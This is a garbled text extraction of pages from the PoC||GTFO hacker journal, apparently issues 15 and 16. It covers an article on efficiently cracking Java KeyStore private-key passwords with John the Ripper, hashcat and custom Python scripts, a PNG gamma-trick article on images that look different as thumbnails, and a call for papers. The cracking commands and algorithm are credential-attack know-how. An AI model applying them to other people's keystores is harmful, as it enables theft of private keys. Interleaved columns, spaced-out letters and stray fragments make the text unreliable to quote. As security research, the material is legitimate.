(keypass), then crack it with John:
k e y t o o l −g e n k e y −dname
’CN=t e s t , OU=t e s t , O=t e s t , L=t e s t , S=t e s t , C=CH ’
−noprompt − a l i a s m y t e s t k e y −k e y s i z e 5 1 2
−k e y a l g RSA −k e y s t o r e r s a _ 5 1 2 . j k s
− s t o r e p a s s 1 2 3 4 5 6 7 −k e y p a s s 7 6 5 4 3 2 1
$ pypy k e y s t o r e 2 j o h n . py r s a _ 5 1 2 . j k s > k e y s t o r e . t x t
$ / o p t / j o h n −1.8.0 − jumbo −1/ r u n / j o h n
−−w o r d l i s t=w o r d l i s t . t x t k e y s t o r e . t x t
[...]
1234567
( rsa_512 . j k s )
[...]
$
2
4
6
8
10
48 unzip
While this reveals the storepass, we cannot ac-
cess the private key with this password. My proof
of concept will crack the private key password in-
stead: 48
1
3
$ java - jar Jk s Pr i vk Pr e pa re . jar rsa_512 . jks > privkey . txt
$ pypy jks privk_ crack . py privkey . txt
Password : ’ 7654321 ’
Naive Password Cracking
If we take the perspective of an attacker, we can con-
clude that we will not need to crack any password in
the first case to get access to the private key. In the-
ory, it also doesn’t matter which password we find
out in the second case, as both are the same. And
in the third case we can simply ignore the key store
password; we only need to crack attack the private
key password.
However, when we encounter the second case in
practice, we would like to use the most efficient
\
\
\
\
\
-j pocorgtfo15.pdf jksprivk/JksPrivkPrepare.jar jksprivk/jksprivk_crack.py
90password cracking technique to find the key store
password or the private key password. This means
we need to explore first how each password can be
cracked individually and which one leads to the most
efficient cracking method.
There are already several programs that will try
to crack the password of the key store:
summarize, the effort to check one password for va-
lidity is roughly:
(
SHA-1
?
=
• John the Ripper (JtR) Jumbo version 49 ex-
tracts necessary information with a Python
script and the cracking is implemented in C;
(
<password>
"Mighty Aphrodite"
Keys
Checksum
Keystore
It is also important to emphasize again that the
above implementations will waste CPU time if the
key store password is not identical to the private
key password (third case) and are not attempting
to crack the password necessary to extract the pri-
vate key.
There are also implementations that crack the
password of the private key directly:
• KeyStoreBrute 50 tries to load the key store via
the official Java method in Java;
• KeystoreCracker 51 uses the simple official Java
way in Java as well;
• keystoreBrute 52 uses keytool on the com-
mand line with the storepass option (sub-
process);
• android-keystore-recovery 55 tries to decrypt
the entire private key with each password, in
Scala;
• bruteforcer.py 53 uses keytool on the com-
mand line with the storepass option (sub-
process);
• android-keystore-password-recover 56 tries to
decrypt the entire private key with each pass-
word, in Java.
• Patator 54 uses keytool on the command line
with the storepass option (subprocess).
These implementations have in common that
they parse the JKS file format, but then only ex-
tract the entry of the encrypted private keys. For
each private key entry, the first 20 bytes serve as an
Initialization Vector and the last 20 bytes are again
a checksum. The implementations then calculate
a keystream. The keystream starts as the SHA-1
hash of the password plus IV. For every 20 bytes of
the encrypted private key, the next 20 bytes of the
keystream are calculated as the SHA-1 of the pass-
word plus previous keystream block (of 20 bytes).
The encrypted private key bytes are then XORed
with the keystream to get the private key in clear-
text. This is a custom Password Based Encryption
(PBE) scheme with chaining. As a last step, the
cleartext private key is SHA-1 hashed again and
compared to the checksum that was extracted from
the JKS private key entry. Therefore, the effort to
check one password for validity is roughly:
All these parse the JKS file format first, which
has a SHA-1 checksum at the end. They then cal-
culate a SHA-1 hash consisting of the password, the
magic “Mighty␣Aphrodite” and all bytes of the key
store file except for the checksum If the newly calcu-
lated hash matches the checksum, it was the correct
password.
No other operation with the key store password
takes place when parsing the JKS file format; there-
fore, we can conclude that this password is only used
for integrity protection. When the correct password
is guessed and it is the same as the private key pass-
word, an attacker can now decrypt the private key.
From a performance perspective, this means that
for every potential password a SHA-1 hash needs to
be calculated of nearly all bytes of the key store file.
As key stores usually hold private and public keys
of at least 512-byte length, the SHA-1 hash is cal-
culated over several thousand bytes of input. To
49 http://www.openwall.com/lists/john-users/2015/06/07/3
50 git
clone https://github.com/bes/KeystoreBrute
clone https://github.com/jeffers102/KeystoreCracker
52 git clone https://github.com/volure/keystoreBrute
53 https://gist.github.com/robinp/2143870
54 https://www.darknet.org.uk/2015/06/patator-multi-threaded-service-url-brute-forcing-tool/
55 https://github.com/rsertelon/android-keystore-recovery
56 https://github.com/MaxCamillo/android-keystore-password-recover
51 git
91variable-length
encrypted key
key bytes to precalculate the SHA-1 output bytes we
are looking for.
This means, the cracking can be optimized to use
a more efficient two-step cracking algorithm to crack
the private key password. After parsing the JKS file
format and precalculating the necessary values, we
have the following optimized algorithm:
checksum
Key entry
IV
20 bytes
20 bytes
?
=
SHA-1
( decrypted key )
Keystream
0. Choose a password in pseudo UTF-16, mean-
ing that a null byte is added to every character.
SHA-1(<password> + IV)
previous
SHA-1(<password> +
)
block
.
.
.
previous
SHA-1(<password> +
)
block
1. keystream = SHA-1(password + STATIC_-
20_BYTES_IV_FROM_PRIVKEY_ENTRY)
2. Check if bytes at index 0 and 6 to 19 of the
keystream correspond to PRECOMPUTED_15_-
BYTES_DER_PROOF. If they are not the same,
go to step 0.
Efficient Password Cracking
3. Let keybytes be every 20 bytes of STATIC_-
VARIABLE_LEN_ENCRYPTED_BYTES_FROM_-
PRIVKEY_ENTRY.
From a naive perspective, it was not analyzed which
of these algorithms would be more efficient for pass-
word cracking. 57 However, an article on Cryp-
tosense.com was published in 2016 58 and didn’t
seem to get the attention it deserves. It points out
that for the private key password cracking method it
is not necessary to calculate the entire keystream to
reject an invalid password. As the cleartext private
key will be a DER encoded file format, the first SHA-
1 calculation of password plus IV with the XOR op-
eration is sufficient to check if a password candidate
could potentially lead to a valid DER encoded pri-
vate key. These all miss out on this optimization
and therefore do too many SHA-1 calculations for
every password candidate.
It turns out, it is even possible to pre-calculate
the XOR operation. For each password candidate
only one SHA-1 hash needs to be calculated, then
some bytes of the result have to be compared to
the pre-calculated bytes. If the bytes are identi-
cal, this proves that the password might decrypt the
key to a DER format. Practical tests showed that
a DER encoded RSA private key in cleartext will
start with 0x30 and bytes at index six to nineteen
will be 0x00300d06092a864886f70d010101. Simi-
lar fingerprints exist for DSA and EC keys. These
bytes we expect in a DER encoded private key can
be XORed with the corresponding encrypted private
4. For each keybytes:
(a) key += keystream ⊕ keybytes
(b) keystream = SHA-1(passwordkkeystream)
5. checksum = SHA-1(passwordkkey)
6. Check if checksum is STATIC_20_BYTES_-
CHECKSUM_FROM_PRIVKEY_ENTRY. If they are
the same, key is the private key in cleartext
and we can stop. Otherwise, go to step 0.
As practical tests will later indicate, step 3 is
typically never reached with an incorrect password
during cracking and all passwords can be rejected
early. In fact, Hashcat only implements steps 0 to
3, as the probability that a wrong candidate is ever
found is neglectible (1/2 120 )!
Implementation
The parsing of the file format and extraction of the
precomputed values for cracking were implemented
as a standalone JAR Java version 8 command line
application JksPrivkPrepare.jar. The script will
57 While
the key store calculations must do the single SHA-1 over all bytes of the public and private keys in the key store,
the private key calculations are many more SHA-1 calculations but with less bytes as inputs.
58 Might Aphrodite – Dark Secrets of the Java Keystore
59 Running much faster with the PyPy Python implementation rather than CPython. The script works without further de-
pendencies. However, another script in the benchmark section needs the numpy packet. It has to be installed for PyPy. The
easiest way of installing is usually via PIP: pypy -m pip install numpy
921 $ k e y t o o l −genkey −dname ’CN=t e s t , OU=t e s t , O=t e s t , L=t e s t , S=t e s t , C=CH ’ −noprompt \
− a l i a s mytestkey −k e y s i z e 512 −k e y a l g RSA −k e y s t o r e rsa_512_123456 . j k s
\
3
−s t o r e p a s s 123456 −k e y p a s s 123456
$ j a v a −j a r J k s P r i v k P r e p a r e . j a r rsa_512_123456 . j k s > privkey_123456 . t x t
5 $ pypy −m c P r o f i l e −s t o t t i m e j k s p r i v k _ n a i v e _ c r a c k . py privkey_123456 . t x t
Password : ’ 123456 ’
7
10278681 f u n c t i o n c a l l s ( 1 0 2 7 7 7 3 4 p r i m i t i v e c a l l s ) i n 9 . 7 6 3 s e c o n d s
[...]
9
ncalls
tottime
percall
cumtime
percall filename : lineno ( function )
123457
2.944
0.000
2.944
0 . 0 0 0 j k s p r i v k _ n a i v e _ c r a c k . py : 1 4 ( x o r )
11
2345683
1.651
0.000
1.651
0 . 0 0 0 { method ’ d i g e s t ’ o f ’HASH ’ o b j e c t s }
2345684
1.608
0.000
1.608
0.000 { _hashlib . openssl_sha1 }
13
2345683
1.491
0.000
5.266
0 . 0 0 0 j k s p r i v k _ n a i v e _ c r a c k . py : 1 9 ( get_keystream )
[...]
15 $ pypy −m c P r o f i l e −s t o t t i m e j k s p r i v k _ c r a c k . py privkey_123456 . t x t
Password : ’ 123456 ’
17
649118 f u n c t i o n c a l l s ( 6 4 8 1 7 1 p r i m i t i v e c a l l s ) i n 0 . 4 3 8 s e c o n d s
[...]
19
ncalls
tottime
percall
cumtime
percall filename : lineno ( function )
123476
0.086
0.000
0.086
0 . 0 0 0 { method ’ d i g e s t ’ o f ’HASH ’ o b j e c t s }
21
123477
0.067
0.000
0.067
0.000 { _hashlib . openssl_sha1 }
1
0.056
0.056
0.293
0 . 2 9 3 j k s p r i v k _ c r a c k . py : 5 4 ( g e t _ c a n d i d a t e s )
23
14
0.055
0.004
0.486
0 . 0 3 5 __init__ . py :1( < module >)
[...]
Figure 11. Java Key Store with a Short Password
Benchmarking
prepare the precomputed values for a given JKS file
and outputs it as asterix separated values.
As a PoC, a Python script jksprivk_crack.py 59
was implemented to do the actual cracking of the
private key password. To put a final nail in the cof-
fin of the JKS format, it is important to enable the
security community to do efficient password crack-
ing. 60 To optimize cracking speed, Jens “atom”
Steube — developer of the Hashcat password recov-
ery program — implemented the cracking step in
GPU optimized code. Hashcat takes the same ar-
guments as the Python cracking script. As hashcat
uses a weakness in SHA-1, 61 the cracking speed on
a single NVidia GTX 1080 GPU reaches around 7.8
(stock clock) to 8.5 (overclocked) billion password
tries per second. 62 This allows to try all alphanu-
meric passwords (uppercase, lowercase, numbers) of
length eight in about eight hours on a single GPU.
When doing a benchmark, it is important to try
to measure the actual algorithm and not some inef-
ficiency of the implementation. Some simple mea-
surements were done by implementing the described
techniques in Python. All the mentioned resources
are available in the feelies. 63 Let’s first look at
the naive implementation of the private key cracker
jksprivk_naive_crack.py versus the efficient pri-
vate key cracking algorithm jksprivk_crack.py.
Let’s generate a test JKS file first. We can generate
a small 512-byte RSA key pair with the password
123456, then crack it with both implementations.
Both implementations only try numeric passwords,
starting with length 6 password 000000 and incre-
menting, as in Figure 11.
These measurements show that a lot more calls
to the update and digest function of SHA-1 are nec-
essary to crack the password in the naive script. If
the keysize of the private key in the JKS store is big-
ger, the time difference is even greater. Therefore,
we conclude that our efficient cracking method is far
_____: _____________
_____: v3.6.0
____________
_\
|__\______
_/_______ _\
|_____ _______\______
/__ ______
|
_
| __
\
____/____
_
|
___/____ __
|_______/
|
|
| \
_\____
/
|
|
\
/ \
|
|
|_____|
|______/
/
/____|
|_________/_________:
|
|_____:-aTZ!/___________/
|_____:
/_______:
* BLAKE2 * BLOCKCHAIN2 * DPAPI * CHACHA20 * JAVA KEYSTORE * ETHEREUM WALLET *
60 The Python script only reaches around 220,000 password-tries per second when run with PyPy on a single 3-GHz CPU.
62 git clone https://github.com/hashcat/hashcat
-j pocorgtfo15.pdf jksprivk/jksprivk_resources.zip
61 https://hashcat.net/events/p12/js-sha1exp_169.pdf
63 unzip
932
4
6
8
10
12
14
16
18
20
22
24
26
28
30
$ k e y t o o l −genkey −dname ’CN=t e s t , OU=t e s t , O=t e s t , L=t e s t , S=t e s t , C=CH ’ −noprompt \
− a l i a s mytestkey −k e y s i z e 512 −k e y a l g RSA −k e y s t o r e rsa_512_12345678 . j k s
\
−s t o r e p a s s 12345678 −k e y p a s s 12345678
$ j a v a −j a r J k s P r i v k P r e p a r e . j a r rsa_512_12345678 . j k s > privkey_12345678 . t x t
$ pypy −m c P r o f i l e −s t o t t i m e j k s p r i v k _ c r a c k . py privkey_12345678 . t x t
Password : ’ 12345678 ’
116760228 f u n c t i o n c a l l s ( 1 1 6 7 5 9 2 8 1 p r i m i t i v e c a l l s ) i n 6 0 . 0 0 9 s e c o n d s
[...]
ncalls
tottime
percall
cumtime
percall filename : lineno ( function )
23345699
16.940
0.000
16.940
0.000 { _hashlib . openssl_sha1 }
23345698
16.082
0.000
16.082
0 . 0 0 0 { method ’ d i g e s t ’ o f ’HASH ’ o b j e c t s }
23345775
10.971
0.000
10.972
0 . 0 0 0 { method ’ j o i n ’ o f ’ s t r ’ o b j e c t s }
1
8.560
8.560
59.851
5 9 . 8 5 1 j k s p r i v k _ c r a c k . py : 5 4 ( g e t _ c a n d i d a t e s )
23345698
4.024
0.000
4.024
0 . 0 0 0 { method ’ update ’ o f ’HASH ’ o b j e c t s }
23345679
3.274
0.000
14.245
0 . 0 0 0 j k s p r i v k _ c r a c k . py : 9 1 ( next_brute_force_token )
[...]
$ pypy / opt / john −1.8.0 − jumbo−1/run / k e y s t o r e 2 j o h n . py rsa_512_12345678 . j k s \
> keystore_12345678 . txt
$ pypy −m c P r o f i l e −s t o t t i m e j k s k e y s t o r e _ c r a c k . py k e y s t o r e _ 1 2 3 4 5 6 7 8 . t x t
Password : ’ 12345678 ’
163420866 f u n c t i o n c a l l s i n 8 4 . 7 1 9 s e c o n d s
[...]
ncalls
tottime
percall
cumtime
percall filename : lineno ( function )
70037037
33.712
0.000
33.712
0 . 0 0 0 { method ’ update ’ o f ’HASH ’ o b j e c t s }
23345679
17.780
0.000
17.780
0 . 0 0 0 { method ’ d i g e s t ’ o f ’HASH ’ o b j e c t s }
23345680
12.022
0.000
12.022
0.000 { _hashlib . openssl_sha1 }
23345682
9.679
0.000
9.679
0 . 0 0 0 { method ’ j o i n ’ o f ’ s t r ’ o b j e c t s }
1
8.482
8.482
84.716
8 4 . 7 1 6 j k s k e y s t o r e _ c r a c k . py : 1 4 ( crack_password )
23345679
3.042
0.000
12.721
0 . 0 0 0 j k s k e y s t o r e _ c r a c k . py : 2 6 ( next_brute_force_token )
[...]
Figure 12. Java Key Store with a Longer Password
94more suitable.
Now we still have to compare the efficient crack-
ing of the private key password with the cracking of
the key store password. The algorithm for key store
password cracking was also implemented in Python:
jkskeystore_crack.py. It takes a password file as
argument like John the Ripper does. As these imple-
mentations are more efficient, let’s generate a new
JKS with a longer password, as shown in Figure 12.
In this profile, we see that the update method of
the SHA-1 object when cracking the key store takes
much longer to return and is called more often, as
more data goes into the SHA-1 calculation. Again,
the efficient cracking algorithm for the private key
is faster and the difference is even bigger for bigger
key sizes
So far we tried to compare techniques in Python.
As they use the same SHA-1 implementation, the
benchmarking was kind of fair. Let’s compare two
vastly different implementations, the efficient al-
gorithm jksprivk_crack.py to John the Ripper.
First, create a wordlist for John with the same nu-
meric passwords as the Python script will try, then
run the comparison shown in Figure 13.
That figure shows that John is faster for 512-bit
keys, but as soon as we grow to 1024-bit keys in Fig-
ure 14, we see that our humble little Python script
wins the race against John. It’s faster, even without
John’s fancy C code or optimizations!
As John the Ripper needs to do SHA-1 opera-
tions for the entire key store content, the Python
script outperforms John the Ripper. For larger key
sizes, the difference is even bigger.
These benchmarks were all done with CPU cal-
culations and Hashcat will use performance opti-
mized GPU code and Markov Chains for password
generation. Cracking a JKS with private key pass-
word POC||GTFO on a single overclocked NVidia
GTX 1080 GPU is illustrated on Figure 15.
Neighborly Greetings
Neighborly greetings go out to atom, vollkorn, cem,
doegox, ange, xonox and rexploit for supporting this
article in one form or another
952
4
6
8
10
12
14
$ k e y t o o l −genkey −dname ’CN=t e s t , OU=t e s t , O=t e s t , L=t e s t , S=t e s t , C=CH ’ −noprompt \
− a l i a s mytestkey −k e y s i z e 512 −k e y a l g RSA −k e y s t o r e rsa_512_12345678 . j k s
\
−s t o r e p a s s 12345678 −k e y p a s s 12345678
$ j a v a −j a r J k s P r i v k P r e p a r e . j a r rsa_512_12345678 . j k s > privkey_12345678 . t x t
$ time pypy j k s p r i v k _ c r a c k . py privkey_12345678 . t x t
Password : ’ 12345678 ’
54.96 r e a l
53.76 user
0.71 sys
$ pypy / opt / john −1.8.0 − jumbo−1/run / k e y s t o r e 2 j o h n . py rsa_512_12345678 . j k s
\
> keystore_12345678 . txt
$ time / opt / john −1.8.0 − jumbo−1/run / j o h n −−w o r d l i s t=w o r d l i s t . t x t k e y s t o r e _ 1 2 3 4 5 6 7 8 . t x t
[...]
12345678
( rsa_512_12345678 . j k s )
[...]
42.28 r e a l
41.55 user
0.33 sys
Figure 13. John the Ripper is faster for 512-byte keystores.
$ time pypy j k s p r i v k _ c r a c k . py privkey_12345678 . t x t
2 Password : ’ 12345678 ’
58.17 r e a l
56.36 user
0.84 sys
4 $ time / opt / john −1.8.0 − jumbo−1/run / j o h n −−w o r d l i s t=w o r d l i s t . t x t k e y s t o r e _ 1 2 3 4 5 6 7 8 . t x t
[...]
6 12345678
( rsa_1024_12345678 . j k s )
[...]
8
64.60 r e a l
62.96 user
0.57 sys
Figure 14. For 1024-bit keystores, our script is faster (full output in the feelies).
$ . / h a s h c a t −m 15500 −a 3 −1 ’ ?u | ’ −w 3 hash . t x t ? 1 ? 1 ? 1 ? 1 ? 1 ? 1 ? 1 ? 1 ? 1
2 h a s h c a t ( v3 . 6 . 0 ) s t a r t i n g . . .
[...]
4 ∗ D e v i c e #1: GeForce GTX 1 0 8 0 , 2026/8107 MB a l l o c a t a b l e , 20MCU
[...]
6 $ j k s p r i v k $ ∗D1BC102EF5FE5F1A7ED6A63431767DD4E1569670 . . . 8 ∗ t e s t :POC | | GTFO
[...]
8 Speed . Dev . # 1 . . . . . :
7 9 4 6 . 6 MH/ s ( 3 9 . 4 8 ms )
[...]
10 S t a r t e d : Tue May 30 1 7 : 4 1 : 5 6 2017
Stopped : Tue May 30 1 7 : 5 0 : 2 4 2017
Figure 15. Cracking session on a NVidia GTX 1080 GPU.
9615:13
The Gamma Trick: Two PNGs for the price of one
by Hector Martin ‘marcan’
Say you’re browsing your favorite hypertext-
encoded, bitmap-containing visuo-lingual informa-
tion distribution medium. You come across an
image which—as we do not yet live in an era of
infinitely scalable resolution—piques your interest
yet is presented as a small thumbnail. Why are they
called thumbnails, anyway?
1
images carry metadata. That metadata includes in-
formation about how the image, and in particular
color information, is itself encoded. The PNG for-
mat can specify how RGB values map to how much
light comes out of the pixels on your screen in several
ways, but one of the simplest is the ‘gAMA’ chunk
which specifies the gamma value of the image, γ.
Intuitively, you’d think that a pixel with 50%
brightness would be encoded as a 0.5 value (or about
0x7f, in an 8-bit format), but that is not the case.
Due to a series of historical circumstances and prac-
tical coincidences too long-winded to be worth going
into, pixel brightness values are not linear. Instead,
they are stored as the brightness value raised to a
power γ. The most common default is γ = 0.4545.
When the image is displayed, the pixels are raised to
the inverse gamma, 2.2, to obtain the linear bright-
ness value. 64 This is typically done by your monitor.
Thus, 50% brightness is actually encoded as 0.73, or
0xba. PNG images can specify an alternate γ value,
and your PNG decoder is responsible for converting
it to the correct display gamma.
Like every other optional feature of every other
file format, whether this is actually implemented is
anyone’s guess. As it turns out, most web browsers
implement it properly, and most image processing
libraries do not. Many websites use these to cre-
ate thumbnails: Reddit, 4chan, Imgur, Google Docs.
We can use this to our advantage.
Take one source image and darken it (map its
brightness range to 0%..80%). Take the other source
image, and lighten it (map its brightness range to
80%..100%). The two images now occupy distinct
portions of the brightness gamut. Now, for every
2x2 group of pixels, take 3 pixels of the darker im-
age and 1 pixel of the lighter image. Finally, encode
the result as a PNG and apply the gAMA PNG tag,
using an extreme value such as γ=0.0227. (Twenty
times lower than the default γ=0.4545.)
Don't click on me.
( i.redd.it )
submitted 3 days ago by marcan42 to r/test
2 com m e nt s
share
Despite the clear instructions not to do so, you
resolve to click, tap, press enter, or otherwise engage
with the image. After all, you have been conditioned
to expect that such an action will yield a higher-
quality image through some opaque and clearly in-
comprehensible process.
Yet the image now appearing before your eyes
is not the same image that you clicked on. Curses!
What is this sorcery? Have I been fooled? Is this
alien technology? Did someone hack Reddit?
The first time I came across this technique was
a few years ago on a post on 4chan. Despite the
fact that the image was not just lewd but downright
unsavory to my taste, I have to admit I spent quite
some time analysing exactly what was going on in
detail. I have since seen this trick used a few times
here and there, and indeed I’ve even used a variant
of it myself in a CTF challenge. Thanks go to my
friend @Miluda for giving me permission to use her
art in this article’s examples.
So, do tell, what is going on? It all has to do with
the PNG format. Like most image formats, PNG
64 Most computers these days use, or at least claim to support, the sRGB colorspace, which doesn’t actually use a pure gamma
function for a bunch of technical reasons. But it approximates γ = 2.2, so we’re rolling with that.
97We can do this easily enough with ImageMagick:
1 $ size = $ ( convert " $high " - format " % wx % h " info :)
$ convert \( " $low " - alpha off + level 0% ,80% \)
3
\( " $high " - alpha off + level 80% ,100% \)
- size $size pattern : gray25 - composite
5
- set gamma 0.022727
- define png : include - chunk = none , gAMA
7
" $output "
Let’s use ImageMagick again. First we’ll apply
a true gamma adjustment to the high source image.
The -gamma operation in ImageMagick performs an
adjustment by the inverse of the supplied value, so
to apply an adjustment of γ = 1/20 we’ll pass in 20.
We’ll also slightly increase its brightness, to ensure
that after gamma adjustment the pixels are close
enough to white:
\
\
\
\
\
When viewed without the specified gamma cor-
rection, all of the lighter pixels (25% of the image)
approach white and the overall image looks like a
washed out version of the darker source image (75%
of the image). The 2 × 2 pixel pattern disappears
when the image is downscaled to less than half of
its original dimensions (if the scaler is any good
anyway). When the gamma correction is applied
to the original image, however, all the darker pix-
els are crushed to black, and now the lighter pixels
span most of the brightness spectrum, revealing the
lighter image as a grid of bright pixels against a
black background. If the image is displayed at 1:1
pixel scale, it will look quite clean. Scales between
100% and 50% typically result in moiré artifacts,
because most scalers cheat. Scaling down usually
darkens the image, because most scalers also don’t
do gamma-correct scaling. 65
1 $ convert " $high " - alpha off + level 3.5% ,100% \
- gamma 20 high_gamma . png
This effectively maps the image range to
0.035 0.05 = 0.846..1.0, but with a non-linear gamma
curve. Next, because the low image will appear
washed out, we’ll apply a gamma of 0.8, then darken
it to 77% of its original brightness. 0.77 20 = 0.005,
which is dark enough to not be noticeable. We’re
keeping this in a variable to chain later.
$ low_gamma = " - alpha off - gamma 0.8 + level 0% ,77% "
Now let’s compensate for the halo caused by the
high image. For every 2x2 output pixels, we’d like
an average color of:
v = 3/4v low + 1/4
That is, as if the high image was completely
white. What we actually have is:
0
v = 3/4v low
+ 1/4v high
0
gives:
Solving for v low
0
v low
= v low − 1/3v high + 1/3
We can implement this in ImageMagick using
-compose Mathematics:
γ = 0.4545
γ = 0.0227
1 $ convert \( " $low " $low_gamma \) high_gamma . png \
- compose Mathematics
\
3
- define compose : args = ’ 0 , -0.33 ,1 ,0.33 ’ \
- composite low_adjusted . png
This approach is the one I’ve seen used so far,
and it is easy to achieve using the Levels tool in
GIMP, but we can do better. The second image is
much too dark: we’re mapping the image to a lin-
ear brightness range, but then applying a very much
non-linear gamma correction. Also, in the first im-
age, we can see a “halo” of the second image, since
the information is actually there. We can fix these
issues.
65 Note that gamma-correct scaling is orthogonal to the gamma trick used here. A simple black-and-white checkerboard should
be downscaled to a solid 0.73 gray (half the photons, or 50% brightness, at γ = 0.4545), but most scalers just average it down
to 0.5, which is wrong. GIMP is one of the few apps that does gamma-correct scaling these days. Isn’t gamma fun?
98There will be some slight edge effects, due to
aliasing issues between the chosen pixels from both
images, but this will remove any blatant solid halo
areas. This correction assumes that the thumbnail
scaler does not perform gamma-correct scaling, 65
which is the common case. This means it is incorrect
if the output image is viewed at 1:1 scale (the halo
will be visible), but once scaled down it will disap-
pear. In order to cater for gamma-correct scalers (or
1:1 viewing), we’d have to perform the adjustment
in a linear colorspace.
Finally, we just compose both images together
with a pattern as before:
$ convert low_adjusted . png high_gamma . png
- size $size pattern : gray25
- composite - set gamma 0.022727
4
- define png : include - chunk = none , gAMA
" $output "
2
The result is much better.
γ = 0.4545
\
\
\
\
γ = 0.0227
The previous images in this article have been fil-
tered (2 × 2 box blur) to remove the high-frequency
pixel pattern, in order to approximate how they
would visually appear in a browser context without
relying on the specific scaling/resampling behavior
of your PDF renderer. In fact, the filtering method
varies: gamma-naive for simulating thumbnailing,
gamma-aware for simulating the true response at
1:1 scale. For your amusement, here are the raw im-
ages. Their appearance will depend on exactly what
kind of filtering, scaling, or other processing is ap-
plied when the PDF is rasterized. Feel free to play
with your zoom setting.
γ = 0.4545
γ = 0.0227
Yup, it’s 2017 and most software still can’t
up/downscale images properly. Now don’t get me
started on the bane that is non-premultiplied alpha,
but that’s a topic for another day
9915:14
Laphroaig’s Home for Unwanted Polyglots and 0day
from the desk of Pastor Manul Laphroaig,
International Church of the Weird Machines
Dearest neighbor,
If you enjoyed reading this little tract, I have
some good news and a polite request for you.
Thanks to the fine folks at No Starch Press, our
768 page Book of PoCkGTFO is sailing on its merry
way across the Pacific ocean! 66 It includes full color
file format illustrations by Ange Albertini, as well
as every article from our first nine releases on thin
paper with gold trim, faux leather binding, and a
ribbon to keep your place. Each article has been
revised, indexed, and cross referenced.
But today I’m writing to ask for your offering.
Not an offering of money, but on offering of writing.
Send me your proofs of concept!
Do this: write an email telling our editors how
to reproduce ONE clever, technical trick from your
research. If you are uncertain of your English, we’ll
happily translate from French, Russian, Southern
Appalachian, and German. If you don’t speak those
languages, we’ll draft a translator from those poor
sods who owe us favors.
Like an email, keep it short. Like an email, you
should assume that we already know more than a
bit about hacking, and that we’ll be insulted or—
WORSE!—that we’ll be bored if you include a long
tutorial where a quick reminder would do.
Just use 7-bit ASCII if your language doesn’t
require funny letters, as whenever we receive some-
thing typeset in OpenOffice, we briefly mistake it
for a ransom note. 8-bit ASCII is also acceptable if
generated on TempleOS. Don’t try to make it thor-
ough or broad. Don’t use bullet-points, as this isn’t
a damned Buzzfeed listicle. Keep your code samples
short and sweet; we can leave the long-form code as
an attachment. Do not send us L A TEX; it’s our job
to do the typesetting!
Don’t tell us that it’s possible; rather, teach us
how to do it ourselves with the absolute minimum
of formality and bullshit.
Like an email, we expect informal language and
hand-sketched diagrams. Write it in a single sit-
ting, and leave any editing for your poor preacher-
man to do over a bottle of fine scotch. Send this
to pastor@phrack org and hope that the neighborly
Phrack folks—praise be to them!—aren’t man-in-the-
middling our submission process.
Yours in PoC and Pwnage,
Pastor Manul Laphroaig, T G S B
66 Preorders
accepted at http://nostarch.com/gtfo
100PoC|| GTFO
P
r
o
o
f
o
f
C
o
n
c
e
p
t
o
r
G
e
t
T
h
e
F
u
c
k
O
u
t
PASTOR LAPHROAIG RACES
THE RUNTIME RELINKER
AND OTHER TRUE TALES
OF CLEVERNESS AND CRAFT
16:02 (p. 5) Sapere aude!
16:03 (p. 7) Emulating a Chevrolet
16:04 (p. 17) Wafer Thin Locks
16:05 (p. 18) Uses for Useless Bugs
16:06 (p. 21) Fragmented Chunks
16:07 (p. 39) Executing Unmapped Thumb
16:08 (p. 45) Naming Network Interfaces
16:09 (p. 47) Obfuscation via Symbolic Regression
16:10 (p. 49) Stack Return Addresses from Canaries
16:11 (p. 52) Rescuing Orphans with Rules of Thumb2
16:12 (p. 58) This PDF Will Help You Reverse Engineer Itself
No se admiten grupos que alteren o molesten a las demas personas del local o vecinos. Это самиздат.
Compiled on October 23, 2017. Free Radare2 license included with each and every copy!
0, $0 USD, $0 AUD, 10s 6d GBP, 0 RSD, 0 SEK, $50 CAD, 6 × 10 29 Pengő (3 × 10 8 Adópengő).Legal Note: We politely ask that you copy this document far and wide.
Reprints: Bitrot will burn libraries with merciless indignity that even Pets Dot Com didn’t deserve. Please
mirror—don’t merely link!—pocorgtfo16.pdf and our other issues far and wide, so our articles can help fight
the coming flame deluge. We like the following mirrors.
https://unpack.debug.su/pocorgtfo/
https://pocorgtfo.hacke.rs/
https://www.alchemistowl.org/pocorgtfo/
https://www.sultanik.com/pocorgtfo/
Technical Note: This file, pocorgtfo16.pdf, is a polyglot that is valid as a PDF document, a ZIP archive,
and a Bash script that runs a Python webserver which hosts Kaitai Struct’s WebIDE which, allowing you
to view the file’s own annotated bytes. Ain’t that nifty?
Cover Art: As with the previous issue, the cover illustration from this release is a Hildebrand engraving
of a painting by Léon Benett that was first published in Le tour du monde en quatre-vingts jours by Jules
Verne in 1873.
Printing Instructions: Pirate print runs of this journal are most welcome! PoCkGTFO is to be printed
duplex, then folded and stapled in the center. Print on A3 paper in Europe and Tabloid (11” x 17”) paper
in Samland, then fold to get a booklet in A4 or Letter size. Secret volcano labs in Canada may use P3
(280 mm x 430 mm) if they like, folded to make P4. The outermost sheet should be on thicker paper to
form a cover.
# This is how to convert an issue for duplex printing.
sudo apt-get install pdfjam
pdfbook --short-edge --vanilla --paper a3paper pocorgtfo16.pdf -o pocorgtfo16-book.pdf
Man of The Book
Manul Laphroaig
Editor of Last Resort
Melilot
TEXnician
Evan Sultanik
Editorial Whipping Boy
Jacob Torrey
Funky File Supervisor
Ange Albertini
Assistant Scenic Designer Philippe Teuwen
Scooby Crew Bus Driver
Ryan Speers
and sundry others
216:01
Every Man His Own Cigar Lighter
Neighbors, please join me in reading this seven-
teenth release of the International Journal of Proof
of Concept or Get the Fuck Out, a friendly little
collection of articles for ladies and gentlemen of dis-
tinguished ability and taste in the field of reverse
engineering and the study of weird machines. This
release is a gift to our fine neighbors in São Paulo,
Budapest, and Philadelphia.
If you are missing the first sixteen issues, we sug-
gest asking a neighbor who picked up a copy of the
first in Vegas, the second in São Paulo, the third
in Hamburg, the fourth in Heidelberg, the fifth in
Montréal, the sixth in Las Vegas, the seventh from
his parents’ inkjet printer during the Thanksgiv-
ing holiday, the eighth in Heidelberg, the ninth in
Montréal, the tenth in Novi Sad or Stockholm, the
eleventh in Washington D.C., the twelfth in Heidel-
berg, the thirteenth in Montréal, the fourteenth in
São Paulo, San Diego, or Budapest, the fifteenth in
Canberra, Heidelberg, or Miami, or the sixteenth
release in Montréal, New York, or Las Vegas.
After our paper release, and only when quality
control has been passed, we will make an electronic
release named pocorgtfo16.pdf. It is a valid PDF
document and a ZIP file filled with fancy papers
and source code. It is also a shell script that runs a
Python script that starts webserver which serves a
